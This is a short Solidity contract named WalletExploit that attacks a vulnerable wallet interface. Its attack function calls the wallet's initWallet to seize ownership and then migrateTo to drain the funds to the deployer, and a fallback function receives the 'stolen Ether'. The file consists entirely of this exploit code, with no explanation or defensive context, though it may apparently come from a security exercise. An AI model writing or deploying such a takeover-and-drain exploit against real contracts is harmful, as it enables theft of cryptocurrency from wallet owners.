pragma solidity ^0.4.24;

interface IVulnerableWallet {
    function initWallet() external;
    function migrateTo(address to) external;
    function deposit() external payable;
    function withdraw(uint256 amount) external;
}

contract WalletExploit {
    IVulnerableWallet public vulnerableWallet;
    address public attacker;

    constructor(address _walletAddress) public {
        vulnerableWallet = IVulnerableWallet(_walletAddress);
        attacker = msg.sender;
    }

    function attack() public {
        // Step 1: Take ownership by calling initWallet()
        vulnerableWallet.initWallet();

        // Step 2: Drain funds to attacker
        vulnerableWallet.migrateTo(attacker);
    }

    // Fallback to receive stolen Ether
    function () external payable {}
}

